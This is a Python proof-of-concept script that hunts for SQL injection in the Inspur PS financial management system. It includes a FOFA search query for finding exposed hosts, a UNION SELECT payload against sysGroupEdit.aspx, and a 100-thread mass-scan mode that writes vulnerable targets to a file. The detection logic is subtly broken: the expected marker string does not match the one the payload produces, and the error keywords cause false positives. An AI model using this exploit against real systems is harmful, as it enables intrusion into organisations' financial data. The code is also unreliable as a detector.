#浪潮PS财务管理SQL注入漏洞检测
#fofa:host="浪潮PS财务管理" || title="浪潮PS财务管理" || body="浪潮PS财务管理" || header="浪潮PS财务管理"
import requests,argparse,sys
import urllib3
import warnings
from multiprocessing.dummy import Pool # 多线程的库

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def main():
    # 初始化
    parse = argparse.ArgumentParser(description="浪潮PS财务管理SQL注入漏洞检测")

    # 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    parse.add_argument('-f','--file',dest='file',type=str,help='please input your file')

    # 实例化
    args = parse.parse_args()

    # 对用户输入的参数做判断 输入正确 url file 输入错误弹出提示
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 多线程处理
        url_list = [] # 用于接收读取文件之后的url
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
        
    else:
        print(f"Usage python {sys.argv[0]} -h")

def poc(target):
    link = "/Web/SysManage/sysGroupEdit.aspx?"
    payload = "id=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%2889%29%2BCHAR%28118%29%2BCHAR%2889%29%2BCHAR%2888%29%2BCHAR%28105%29%2BCHAR%28119%29%2BCHAR%2898%29%2BCHAR%28110%29%2BCHAR%2867%29%2BCHAR%28114%29%2BCHAR%28113%29%2BCHAR%2877%29%2BCHAR%2886%29%2BCHAR%2869%29%2BCHAR%28118%29%2BCHAR%2885%29%2BCHAR%28120%29%2BCHAR%28104%29%2BCHAR%28111%29%2BCHAR%2866%29%2BCHAR%2899%29%2BCHAR%2868%29%2BCHAR%2897%29%2BCHAR%2869%29%2BCHAR%28117%29%2BCHAR%2875%29%2BCHAR%2876%29%2BCHAR%28115%29%2BCHAR%2874%29%2BCHAR%2866%29%2BCHAR%2873%29%2BCHAR%2888%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%2877%29%2BCHAR%2876%29%2BCHAR%2880%29%2BCHAR%2898%29%2BCHAR%28119%29%2BCHAR%2889%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28118%29%2BCHAR%28113%29--+wkZw"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Connection": "close"
    }
    try:
        res1 = requests.get(url=target,headers=headers,verify=False,timeout=5)
        db_errors = [
                "Microsoft OLE DB Provider",
                "ODBC Driver", 
                "SQL Server",
                "Unclosed quotation mark",
                "Syntax error",
                "UNION",
                "SELECT"
            ]
        if res1.status_code == 200:
            res2 = requests.get(url=target+link+payload,headers=headers,verify=False,timeout=5)
            if "qzp bqYvYXiwbnCrqMVEUxhoBcDaEuKLsJBIXxqMLPbwYqjjvq" in res2.text:
                print(f"[+]该{target}存在SQL注入漏洞")
            elif any(error in res2.text for error in db_errors):
                print(f"[+] SQL注入漏洞确认 - 数据库错误信息: {target}")        
                # 写入到一个文件中
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write(f"[+]该{target}存在SQL注入漏洞\n")
            else:
                print(f"[-]该{target}不存在SQL注入漏洞")
    except:
        print(f"该{target}存在问题，请手工测试")
# 函数入口

if __name__ == "__main__":
    main()